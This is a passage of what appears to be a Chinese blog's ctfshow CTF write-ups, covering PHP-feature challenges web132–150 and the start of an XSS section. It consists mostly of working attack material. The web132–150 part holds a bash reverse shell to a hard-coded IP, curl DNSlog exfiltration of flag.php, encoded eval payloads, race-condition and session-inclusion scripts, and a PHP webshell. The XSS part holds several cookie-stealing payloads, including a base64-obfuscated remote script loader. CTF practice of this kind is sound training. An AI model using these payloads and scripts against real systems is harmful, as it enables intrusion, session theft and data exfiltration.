    &#x27;f&#x27;:&#x27;a&#x27;*1000000+&#x27;36Dctfshow&#x27;
&#125;
r=requests.post(url=url,data=data).text
print(r)

</code></pre>
<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)</a></p>
<h1 id="web132">web132</h1>
<p>一个网站，扫目录发现/admin/index.php,得到如下源码</p>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 06:22:13
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 20:05:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

#error_reporting(0);
include(&quot;flag.php&quot;);
highlight_file(__FILE__);


if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;
    $username = (String)$_GET[&#x27;username&#x27;];
    $password = (String)$_GET[&#x27;password&#x27;];
    $code = (String)$_GET[&#x27;code&#x27;];

    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;
        
        if($code == &#x27;admin&#x27;)&#123;
            echo $flag;
        &#125;
        
    &#125;
&#125;</code></pre>
<blockquote>
<p>||的优先级低于&amp;&amp;</p>
<p>mt_rand()函数用于生成随机数</p>
</blockquote>
<p>可以看到只需要满足username=‘admin’就可以</p>
<h1 id="web133">web133</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 16:43:44

*/

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET[&#x27;F&#x27;])&#123;
    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;
        eval(substr($F,0,6));
    &#125;else&#123;
        die(&quot;6个字母都还不够呀?!&quot;);
    &#125;
&#125;</code></pre>
<blockquote>
<p>substr函数返回指定长度的内容</p>
</blockquote>
<p>这里就是把传参内容的前六个字符返回，所以直接?F=<code>$F</code> ;即可绕过然后后面执行命令</p>
<blockquote>
<p>?F=<code>$F</code>; =》 ?F=<code>$F`;`; //第一次的$F是php变量，第二次的$F属于shell里的，所以不会无限套娃，里面`$F`;在shell里执行为空，linux里</code>也不回显，也不存在$F变量，没有任何输出</p>
</blockquote>
<p>发现可以执行命令但是没回显，需要外带，bash失败，用curl</p>
<pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/43.138.40.212/7777 0&gt;&amp;1</code></pre>
<pre><code class="hljs plaintext">?F=`$F`; curl `cat flag.php|grep &quot;flag&quot;`.mp0kz9.dnslog.cn</code></pre>
<p><a href="http://dnslog.cn/">DNSLog Platform</a></p>
<h1 id="web134">web134</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-14 23:01:06

*/

highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;
    die(&quot;nonononono&quot;);
&#125;
@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);
extract($_POST);
if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;
    die(file_get_contents(&#x27;flag.php&#x27;));
&#125;</code></pre>
<p>使用get传参</p>
<pre><code class="hljs plaintext">?_POST[key1]=36d&amp;_POST[key2]=36d</code></pre>
<blockquote>
<p>@parse_str($_SERVER[‘QUERY_STRING’]); 将数据转化为了$_POST[key1]=36d 接着extract($_POST)将$_POST[key1]=36d转化为了$key=36d</p>
</blockquote>
<h1 id="web135">web135</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 18:48:03

*/

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET[&#x27;F&#x27;])&#123;
    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;
        eval(substr($F,0,6));
    &#125;else&#123;
        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);
    &#125;
&#125;</code></pre>
<p>web133的加强版</p>
<p>还是可以执行的，但是这里过滤了更多，其中curl也过滤了。</p>
<p>把flag数据转存到另外一个路径文件下</p>
<h1 id="web136">web136</h1>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
function check($x)&#123;
    if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;
        die(&#x27;too young too simple sometimes naive!&#x27;);
    &#125;
&#125;
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c=$_GET[&#x27;c&#x27;];
    check($c);
    exec($c);
&#125;
else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;</code></pre>
<p>传参c，命令执行，也是无回显，并且过滤了&gt;,和cp，没办法转存到其他文件下</p>
<p>使用tee</p>
<pre><code class="hljs plaintext">ls|tee f
ls /|tee f
cat /f149_15_h3r3|tee f</code></pre>
<blockquote>
<pre><code class="hljs shell">tee a.txt b.txt，将a.txt复制到b.txt
ls | tee b.txt,将ls命令的执行结果写入b.txt</code></pre>
</blockquote>
<h1 id="web137">web137</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 22:27:49

*/

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
&#123;
    function __wakeup()&#123;
        die(&quot;private class&quot;);
    &#125;
    static function getFlag()&#123;
        echo file_get_contents(&quot;flag.php&quot;);
    &#125;
&#125;



call_user_func($_POST[&#x27;ctfshow&#x27;]);</code></pre>
<p>直接调用getflag这个类即可</p>
<pre><code class="hljs plaintext">ctfshow=ctfshow::getFlag</code></pre>
<blockquote>
<p>php中 -&gt;与:: 调用类中的成员的区别<br>
-&gt;用于动态语境处理某个类的某个实例<br>
::可以调用一个静态的、不依赖于其他初始化的类方法.</p>
<p>双冒号可以不用实例化类就可以直接调用类中的方法</p>
</blockquote>
<h1 id="web138">web138</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 22:52:13

*/

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
&#123;
    function __wakeup()&#123;
        die(&quot;private class&quot;);
    &#125;
    static function getFlag()&#123;
        echo file_get_contents(&quot;flag.php&quot;);
    &#125;
&#125;

if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;
    die(&quot;private function&quot;);
&#125;

call_user_func($_POST[&#x27;ctfshow&#x27;]);

</code></pre>
<p>用这个函数也就是过滤：的意思</p>
<p>call_user_func中不但可以传字符串也可以传数组</p>
<blockquote>
<p>call_user_func(array($classname, ‘hello’));<br>
此时会调用 classname中的 hello方法</p>
</blockquote>
<p>所以这道题目就可以这样</p>
<pre><code class="hljs plaintext">ctfshow[0]=ctfshow&amp;ctfshow[1]=getflag</code></pre>
<h1 id="web139">web139</h1>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
function check($x)&#123;
    if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;
        die(&#x27;too young too simple sometimes naive!&#x27;);
    &#125;
&#125;
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c=$_GET[&#x27;c&#x27;];
    check($c);
    exec($c);
&#125;
else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;</code></pre>
<p>web136的升级版，虽然代码没变化但是应该是把tee过滤了，外带不出内容了，盲打</p>
<p>所以要截取字符串，使用awk命令</p>
<p>判断命令执行结果可以使用shell编程的语句以及sleep函数</p>
<p>然后使用cut命令截取每个字符</p>
<p>shell编程,if语句控制输出,sleep控制相应时间</p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">import requests
import time
import string
str=string.digits+string.ascii_lowercase+&quot;-&quot;
result=&quot;&quot;
key=0
for j in range(1,45):
   print(j)
   if key==1:
      break
   for n in str:
      payload=&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)
      #print(payload)
      url=&quot;http://3d4bd4f4-65e4-497e-bf70-06d999bc350e.challenge.ctf.show/?c=&quot;+payload
      try:
         requests.get(url,timeout=(2.5,2.5))
      except:
          result=result+n
          print(result)
          break

ctfshow&#123;cf501030201b8c14e2ab0647f0813547211a00de441f&#125;</code></pre>
<h1 id="web140">web140</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-17 12:39:25

*/

error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123;
    $f1 = (String)$_POST[&#x27;f1&#x27;];
    $f2 = (String)$_POST[&#x27;f2&#x27;];
    if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123;
        if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123;
            $code = eval(&quot;return $f1($f2());&quot;);
            if(intval($code) == &#x27;ctfshow&#x27;)&#123;
                echo file_get_contents(&quot;flag.php&quot;);
            &#125;
        &#125;
    &#125;
&#125;

</code></pre>
<p>intval($code) == 'ctfshow’这地方只需要满足前者code等于0即可</p>
<p>​</p>
<p>数字和字符串弱比较</p>
<pre><code class="hljs plaintext">f1=usleep&amp;f2=usleep
f1=gmdate&amp;f2=gmdate
f1=intval&amp;f2=intval</code></pre>
<h1 id="web141">web141</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-17 19:28:09

*/

#error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;
    $v1 = (String)$_GET[&#x27;v1&#x27;];
    $v2 = (String)$_GET[&#x27;v2&#x27;];
    $v3 = (String)$_GET[&#x27;v3&#x27;];

    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;
        if(preg_match(&#x27;/^\W+$/&#x27;, $v3))&#123;
            $code =  eval(&quot;return $v1$v3$v2;&quot;);
            echo &quot;$v1$v3$v2 = &quot;.$code;
        &#125;
    &#125;
&#125;
</code></pre>
<blockquote>
<p>is_numeric — 检测变量是否为数字或数字字符串 (是，true；否，false)</p>
</blockquote>
<blockquote>
<p>\W是匹配非字母数字下划&lt;===&gt;[^A-Za-z0-9_]</p>
<p>\w是匹配字母数字下划线&lt;===&gt;[A-Za-z0-9_]</p>
</blockquote>
<p>所以这道题目是无参rce</p>
<p>命令执行，通过拼接构造命令</p>
<pre><code class="hljs plaintext">v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</code></pre>
<p>参考</p>
<p><a href="https://blog.csdn.net/weixin_45551083/article/details/110574834">(62条消息) CTFShow web入门123-150 (php特性(二))_lonmar~的博客-CSDN博客</a></p>
<h1 id="web142">web142</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-17 19:36:02

*/

error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&#x27;v1&#x27;]))&#123;
    $v1 = (String)$_GET[&#x27;v1&#x27;];
    if(is_numeric($v1))&#123;
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents(&quot;flag.php&quot;);
    &#125;
&#125;</code></pre>
<p>这道题目就是绕过sleep，直接赋值0即可</p>
<h1 id="web143">web143</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-18 12:48:14

*/

highlight_file(__FILE__);
if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;
    $v1 = (String)$_GET[&#x27;v1&#x27;];
    $v2 = (String)$_GET[&#x27;v2&#x27;];
    $v3 = (String)$_GET[&#x27;v3&#x27;];
    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;
        if(preg_match(&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;, $v3))&#123;
                die(&#x27;get out hacker!&#x27;);
        &#125;
        else&#123;
            $code =  eval(&quot;return $v1$v3$v2;&quot;);
            echo &quot;$v1$v3$v2 = &quot;.$code;
        &#125;
    &#125;
&#125;</code></pre>
<p>在web141的基础上又过滤了<code>-</code>和<code>;</code>，那么v3开头和结尾的符号就可以变成<code>*</code>或<code>/</code></p>
<pre><code class="hljs plaintext">?v1=1&amp;v2=2&amp;v3=*(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%02%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2c%60%60%60&quot;)?&gt;</code></pre>
<h1 id="web144">web144</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-18 16:21:15

*/

highlight_file(__FILE__);
if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;
    $v1 = (String)$_GET[&#x27;v1&#x27;];
    $v2 = (String)$_GET[&#x27;v2&#x27;];
    $v3 = (String)$_GET[&#x27;v3&#x27;];

    if(is_numeric($v1) &amp;&amp; check($v3))&#123;
        if(preg_match(&#x27;/^\W+$/&#x27;, $v2))&#123;
            $code =  eval(&quot;return $v1$v3$v2;&quot;);
            echo &quot;$v1$v3$v2 = &quot;.$code;
        &#125;
    &#125;
&#125;

function check($str)&#123;
    return strlen($str)===1?true:false;
&#125;</code></pre>
<p>check函数限制v3长度为1</p>
<p>换一下位置即可，paylaod同上</p>
<h1 id="web145">web145</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-18 17:41:33

*/


highlight_file(__FILE__);
if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;
    $v1 = (String)$_GET[&#x27;v1&#x27;];
    $v2 = (String)$_GET[&#x27;v2&#x27;];
    $v3 = (String)$_GET[&#x27;v3&#x27;];
    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;
        if(preg_match(&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;, $v3))&#123;
                die(&#x27;get out hacker!&#x27;);
        &#125;
        else&#123;
            $code =  eval(&quot;return $v1$v3$v2;&quot;);
            echo &quot;$v1$v3$v2 = &quot;.$code;
        &#125;
    &#125;
&#125;</code></pre>
<pre><code class="hljs plaintext">?v1=1&amp;v2=2&amp;v3=|(&#x27;%13%19%13%14%05%0d&#x27;|&#x27;%60%60%60%60%60%60&#x27;)(&#x27;%03%01%14%00%06%0c%01%07%02%10%08%10&#x27;|&#x27;%60%60%60%20%60%60%60%60%2c%60%60%60&#x27;)|</code></pre>
<h1 id="web146">web146</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-18 17:41:33

*/


highlight_file(__FILE__);
if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;
    $v1 = (String)$_GET[&#x27;v1&#x27;];
    $v2 = (String)$_GET[&#x27;v2&#x27;];
    $v3 = (String)$_GET[&#x27;v3&#x27;];
    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;
        if(preg_match(&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;, $v3))&#123;
                die(&#x27;get out hacker!&#x27;);
        &#125;
        else&#123;
            $code =  eval(&quot;return $v1$v3$v2;&quot;);
            echo &quot;$v1$v3$v2 = &quot;.$code;
        &#125;
    &#125;
&#125;</code></pre>
<p>上一题的升级版</p>
<p>同上</p>
<h1 id="web147">web147</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 02:04:38

*/



highlight_file(__FILE__);

if(isset($_POST[&#x27;ctf&#x27;]))&#123;
    $ctfshow = $_POST[&#x27;ctf&#x27;];
    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;
        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);
    &#125;

&#125;</code></pre>
<blockquote>
<p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</p>
</blockquote>
<blockquote>
<p><code>\</code>是全局命名空间，由于命名空间问题，如果要绝对调用一个函数，例如system，那么就要写成<code>\system</code></p>
</blockquote>
<pre><code class="hljs plaintext">?show=;&#125;;phpinfo();/*
ctf=\create_function</code></pre>
<p><a href="https://my.oschina.net/huyex/blog/2885273">PHP create_function()代码注入</a></p>
<h1 id="web148">web148</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 03:52:11

*/



include &#x27;flag.php&#x27;;
if(isset($_GET[&#x27;code&#x27;]))&#123;
    $code=$_GET[&#x27;code&#x27;];
    if(preg_match(&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;,$code))&#123;
        die(&quot;error&quot;);
    &#125;
    @eval($code);
&#125;
else&#123;
    highlight_file(__FILE__);
&#125;

function get_ctfshow_fl0g()&#123;
    echo file_get_contents(&quot;flag.php&quot;);
&#125;</code></pre>
<p>无参rce</p>
<pre><code class="hljs plaintext">/?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</code></pre>
<h1 id="web149">web149</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 04:34:40

*/


error_reporting(0);
highlight_file(__FILE__);

$files = scandir(&#x27;./&#x27;); 
foreach($files as $file) &#123;
    if(is_file($file))&#123;
        if ($file !== &quot;index.php&quot;) &#123;
            unlink($file);
        &#125;
    &#125;
&#125;

file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);

$files = scandir(&#x27;./&#x27;); 
foreach($files as $file) &#123;
    if(is_file($file))&#123;
        if ($file !== &quot;index.php&quot;) &#123;
            unlink($file);
        &#125;
    &#125;
&#125;</code></pre>
<p>条件竞争</p>
<pre><code class="hljs plaintext">import io
import requests
import threading

url = &#x27;http://d3aa0fa3-8a63-4994-8a43-80891c436065.chall.ctf.show/&#x27;


def write():
    while event.isSet():
        data = &#123;
            &#x27;show&#x27;: &#x27;&lt;?php system(&quot;cat /ctfshow_fl0g_here.txt&quot;);?&gt;&#x27;
        &#125;
        requests.post(url=url+&#x27;?ctf=1.php&#x27;, data=data)


def read():
    while event.isSet():
        response = requests.get(url + &#x27;1.php&#x27;)
        if response.status_code != 404:
            print(response.text)
            event.clear()


if __name__ == &quot;__main__&quot;:
    event = threading.Event()
    event.set()
    for i in range(1, 100):
        threading.Thread(target=write).start()

    for i in range(1, 100):
        threading.Thread(target=read).start()

</code></pre>
<p>还有个非预期就是直接写🐎</p>
<pre><code class="hljs plaintext">GET ?ctf=index.php
POST show=&lt;?php eval($_POST[hack]);?&gt;</code></pre>
<h1 id="web150">web150</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 07:12:57

*/
include(&quot;flag.php&quot;);
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW&#123;
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct()&#123;
        $this-&gt;vip = 0;
        $this-&gt;secret = $flag;
    &#125;

    function __destruct()&#123;
        echo $this-&gt;secret;
    &#125;

    public function isVIP()&#123;
        return $this-&gt;vip?TRUE:FALSE;
        &#125;
    &#125;

    function __autoload($class)&#123;
        if(isset($class))&#123;
            $class();
    &#125;
&#125;

#过滤字符
$key = $_SERVER[&#x27;QUERY_STRING&#x27;];
if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;
    die(&quot;error&quot;);
&#125;
$ctf = $_POST[&#x27;ctf&#x27;];
extract($_GET);
if(class_exists($__CTFSHOW__))&#123;
    echo &quot;class is exists!&quot;;
&#125;

if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;
    include($ctf);
&#125;
</code></pre>
<p>包含session</p>
<pre><code class="hljs plaintext"># -*- coding: utf-8 -*-
# @Time : 20.12.5 13:52
# @author:lonmar
import io
import requests
import threading

sessid = &#x27;test&#x27;
data = &#123;
    &quot;ctf&quot;: &quot;/tmp/sess_test&quot;,
    &quot;cmd&quot;: &#x27;system(&quot;cat flag.php&quot;);&#x27;
&#125;


def write(session):
    while event.isSet():
        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)
        resp = session.post(&#x27;http://17787258-2baa-4fff-a0c2-75d262f85b01.challenge.ctf.show/&#x27;,
                            data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;,
                            files=&#123;&#x27;file&#x27;: (&#x27;test.txt&#x27;, f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;)


def read(session):
    while event.isSet():
        res = session.post(
            &#x27;http://17787258-2baa-4fff-a0c2-75d262f85b01.challenge.ctf.show/?isVIP=1&#x27;,
            data=data
        )
        if &#x27;flag&#123;&#x27; in res.text:
            print(res.text)
            event.clear()
        else:
            print(&#x27;[*]retrying...&#x27;)


if __name__ == &quot;__main__&quot;:
    event = threading.Event()
    event.set()
    with requests.session() as session:
        for i in range(1, 5):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 5):
            threading.Thread(target=read, args=(session,)).start()
</code></pre>
<h1 id="web150_plus">web150_plus</h1>
<p>只是多了一个log的过滤，同上</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>ctfshow</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>PHP特性</tag>
      </tags>
  </entry>
  <entry>
    <title>xss</title>
    <url>/2022/03/24/ctfshowxss/</url>
    <content><![CDATA[<p>ctfshow里面的xss刷题记录</p>
<span id="more"></span>
<h1 id="web316">web316</h1>
<p>这道题先测试一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131205683.png?x-oss-process=hzy" alt="image-20220713120540614"></p>
<p>存在xss漏洞，毕竟是第一题，应该没有任何过滤，直接打cookie即可！<a href="https://xss.pt/">XSS平台</a>在这个平台里面</p>
<p>记录可用的姿势：</p>
<blockquote>
<p>img</p>
<p><code>&lt;script&gt; var img=document.createElement(&quot;img&quot;); img.src=&quot;http://ip/&quot;+document.cookie; &lt;/script&gt;</code></p>
<p>直接创建img标签的话，比如这样<code>&lt;img src=&quot;http://ip:39543/&quot;+document.cookie /&gt;</code>不行，这里识别不到document.cookie，套一层<code>&lt;script&gt;&lt;/script&gt;</code>也不行。</p>
<p>还有其他外带姿势</p>
<p>window.open</p>
<p><code>&lt;script&gt;window.open('http://ip/'+document.cookie)&lt;/script&gt;</code></p>
<p><code>&lt;script&gt;window.location.href='http://ip/'+document.cookie&lt;/script&gt;</code></p>
<p><code>&lt;script&gt;location.href='http://ip/'+document.cookie&lt;/script&gt;</code></p>
<p>input也可以，但是要加上autofocus</p>
<p><code>&lt;input onfocus=&quot;window.open('http://ipx/'+document.cookie)&quot; autofocus&gt;</code></p>
</blockquote>
<blockquote>
<p>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</p>
</blockquote>
<blockquote>
<p>svg标签</p>
<p><code>&lt;svg onload=&quot;window.open('http://ip/'+document.cookie)&quot;&gt;</code></p>
</blockquote>
<blockquote>
<p>iframe标签</p>
<p><code>&lt;iframe onload=&quot;window.open('http://ip/'+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></p>
</blockquote>
<blockquote>
<p>body标签</p>
<p><code>&lt;body onload=&quot;window.open('http://ip/'+document.cookie)&quot;&gt;</code></p>
</blockquote>
<p>正常的vps需要nc，但是nc好像不能持续接收，但是方法有很多，可以重复起nc，也可以写个python然后起一个临时的服务器，接收一下get参数</p>
<pre><code class="hljs plaintext">python3 -m http.server 39543</code></pre>
<p>这道题直接上传标准形式即可！</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/4dccf0b5217a4aa0caf2f733a56907e1.png?x-oss-process=hzy" alt="image-20220324192000984"></p>
<p>显示不是管理员没有flag</p>
<p>换一个，用一个url一次编码的</p>
<blockquote>
<pre><code class="hljs plaintext">%26lt%3B%2FtExtArEa%26gt%3B%26%23039%3B%26quot%3B%26gt%3B%26lt%3BsCRiPt%20sRC%3Dhttps%3A%2F%2Fxss.pt%2Frxab%26gt%3B%26lt%3B%2FsCrIpT%26gt%3B</code></pre>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/78fa0aa22d544ede48319bb58a34d750.png?x-oss-process=hzy" alt="image-20220325104330643"></p>
<p>得到flag!</p>
<blockquote>
<p>还有另一种方法，进行监听日志！</p>
<p><code>&lt;script&gt;window.open('http://ip/'+document.cookie)&lt;/script&gt;</code></p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/4a823f15884b24bbb418f2c9dbb5e9aa.png?x-oss-process=hzy" alt="image-20220402122311481"></p>
<h1 id="web317">web317</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/0b1de4927bff18c0048789cbbf40b6a1.png?x-oss-process=hzy" alt="image-20220325105741041"></p>
<p>还是这样的界面，只不过已经开始过滤了，问题不大，过滤哪个就不用哪个，换成其他代码一样的步骤</p>
<blockquote>
<p>测试了一下过滤了script，使用img标签！</p>
<p><code>'&quot;&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly94c3N5ZS5jb20veDNUdyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/7e950a5575d50083331a4adfcf7a66db.png?x-oss-process=hzy" alt="image-20220325115249559"></p>
<blockquote>
<p>成功反弹，但是还是不能成为ADMIN，尝试一下用</p>
